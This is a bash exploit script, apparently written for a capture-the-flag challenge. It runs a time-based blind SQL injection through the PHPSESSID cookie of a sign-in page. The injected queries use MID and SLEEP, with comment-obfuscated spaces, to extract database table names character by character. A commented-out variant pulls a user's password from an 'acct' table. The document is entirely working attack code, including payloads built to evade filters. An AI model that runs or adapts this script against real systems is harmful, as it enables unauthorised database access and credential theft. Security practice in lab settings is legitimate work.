CHAR=(a b c d e f g h i j k l m n o p q r s t u v w x y z)  
POS=1
OUTPUT=""

while true; do
    for i in $(seq 0 25); do
        c=${CHAR[$i]}
        #QUERY="fgika32sarb8f3qifdetm9vk45' -IF(MID((select/**/**/from/**/information_schema.tables/**/where/**/table_schema=markito), $POS,1) = '$c', SLEEP(0.5),0) AND 'a'='a" 
        #QUERY="fgika32sarb8f3qifdetm9vk45' -IF(MID((select/**/*/**/from/**/information_schema.tables/**/where/**/table_schema=database()), $POS,1) = '$c', SLEEP(0.5),0) AND 'a'='a"        
        #QUERY="fgika32sarb8f3qifdetm9vk45'-IF(MID((select/**/pass/**/from/**/acct/**/where/**/user/**/like/**/'mrossi%25'/**/limit/**/1),$POS,1) = '$c', SLEEP(0.5),0) AND 'a'='a"
        #QUERY="fgika32sarb8f3qifdetm9vk45' -IF(MID((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()), $POS,1) = '$c', SLEEP(0.5),0) AND 'a'='a"        
        QUERY="fgika32sarb8f3qifdetm9vk45' -IF(MID((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()), $POS,1) = '$c', SLEEP(0.5),0) AND 'a'='a"
        TIME=`(time curl -i -s -k -X $'GET' -H $'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'DNT: 1' -H $'Upgrade-Insecure-Requests: 1' -b "PHPSESSID=$QUERY" $'http://ctf-hib.thesthack.com/signin.php')  2>&1 | grep real | awk '{print $2}' | cut -f2 -d'm' | cut -f1 -d'.'|sed s/s//`
        #echo $TIME
        if [[ $TIME > 1 ]]; then
            #echo $OUTPUT 
            POS=$((POS+1))
            MISS=0
            #break
            echo -n $c
        else
                MISS=$((MISS+1))
        fi

        if [[ $MISS == 25 ]]; then
                echo -e "\nno more to find"
                exit 0
        fi

        done

done
